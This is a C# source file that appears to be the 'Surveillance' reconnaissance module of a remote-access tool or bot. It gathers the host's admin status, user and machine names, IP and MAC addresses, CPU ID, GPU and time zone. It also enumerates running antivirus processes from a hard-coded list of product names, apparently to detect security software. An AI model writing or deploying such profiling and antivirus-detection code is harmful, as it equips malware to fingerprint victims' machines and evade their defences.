using System;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net;
using System.Net.Sockets;
using System.Management;
using System.Reflection;
using System.Security.Principal;

namespace Kernel.Functions.Surveillance
{
    class Intelligence {
        public static bool isAdmin = new WindowsPrincipal(WindowsIdentity.GetCurrent())
        .IsInRole(WindowsBuiltInRole.Administrator);

        public static string MachineName = Environment.MachineName;
        public static string UserName = Environment.UserName;
        public static string OperatingSystem = Convert.ToString(Environment.OSVersion);
        public static string LocationDirectory = Assembly.GetExecutingAssembly().Location;
        public static int ProcessorCount = Environment.ProcessorCount;
        public static string Antivirus = Func.Antivirus();
        public static string LocalIPAddress = Func.LocalIPAddress();
        public static string macAddresses = Func.macAddresses();
        public static string Processor = Func.CPU();
        public static string ProcessorId = Func.CPUId();
        public static string GPU = Func.GPU();
        public static string TimeZone = Func.TimeZone();
        public static string Digit() { if (Environment.Is64BitOperatingSystem) { return "x64"; } else { return "x32"; } }

        internal class Func {
            public static string Antivirus() {
                string[] AntivirusSF = new string[10] { "AVP", "egui", "ffavg", "avgnt", "ashDisp", "NortonAntiBot", "Mcshield", "avengine", "cfp", "drweb" };
                string antivirus = null;
                for (int i = 0; i < AntivirusSF.Length; i++) {
                    foreach (Process p in Process.GetProcessesByName(AntivirusSF[i])) {
                        antivirus = antivirus + AntivirusSF[i] + ", ";
                    }
                }
                antivirus = antivirus.Remove(antivirus.Length - 2) + ".";
                return antivirus;
            }

            public static string LocalIPAddress() {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var ip in host.AddressList) {
                    if (ip.AddressFamily == AddressFamily.InterNetwork) {
                        return ip.ToString();
                    }
                }
                throw new Exception("None");
            }

            public static string Processes() {
                string Proc = null, Buf = null;
                Process[] procList = Process.GetProcesses();
                for (int i = 1; i < procList.Length; i++) {
                    Buf = Convert.ToString(procList[i]);
                    Buf = Buf.Substring(Buf.IndexOf('(') + 1, Buf.IndexOf(')') - Buf.IndexOf('(') - 1) + ", ";
                    Proc = Proc + Buf;
                }  
                Proc = Proc.Remove(Proc.Length - 2); Proc = Proc + ".";
                return Proc;
            }

            public static string macAddresses() {
                string macAddresses = "";
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces()) {
                    if (nic.OperationalStatus == OperationalStatus.Up) {
                        macAddresses += nic.GetPhysicalAddress().ToString();
                        break;
                    }
                }
                return macAddresses;
            }

            public static string TimeZone() {
                string result = Convert.ToString(TimeZoneInfo.Local.GetUtcOffset(DateTime.UtcNow));
                if (result.Substring(0, 1) == "-") {
                    if (result.Substring(1, 1) == "0")
                        return "UTC-" + result.Substring(2, 1);
                    else
                        return "UTC" + result.Substring(0, 3);
                } else {
                    if (result.Substring(0, 1) == "0")
                        return "UTC+" + result.Substring(1, 1);
                    else
                        return "UTC+" + result.Substring(0, 2);
                }
            }

            public static string CPUId() {
                ManagementClass myManagementClass = new ManagementClass("Win32_Processor");
                ManagementObjectCollection myManagementCollection = myManagementClass.GetInstances();
                PropertyDataCollection myProperties = myManagementClass.Properties;
                string result = null;
                foreach (var obj in myManagementCollection) {
                    foreach (var myProperty in myProperties) {
                        if (myProperty.Name == "ProcessorId") {
                            result = Convert.ToString(obj.Properties[myProperty.Name].Value);
                        }
                    }
                }
                return result;
            }

            public static string CPU() {
                ManagementClass myManagementClass = new ManagementClass("Win32_Processor");
                ManagementObjectCollection myManagementCollection = myManagementClass.GetInstances();
                PropertyDataCollection myProperties = myManagementClass.Properties;
                string result = null;
                foreach (var obj in myManagementCollection) {
                    foreach (var myProperty in myProperties) {
                        if (myProperty.Name == "Name") {
                            result = Convert.ToString(obj.Properties[myProperty.Name].Value);
                        }
                    }
                }
                return result;
            }

            public static string GPU() {
                ManagementClass myManagementClass = new ManagementClass("Win32_VideoController");
                ManagementObjectCollection myManagementCollection = myManagementClass.GetInstances();
                PropertyDataCollection myProperties = myManagementClass.Properties;
                string result = null;
                foreach (var obj in myManagementCollection) {
                    foreach (var myProperty in myProperties) {
                        if (myProperty.Name == "Name"){
                            result = Convert.ToString(obj.Properties[myProperty.Name].Value);
                        }
                    }
                }
                return result;
            }
        }
    }
}
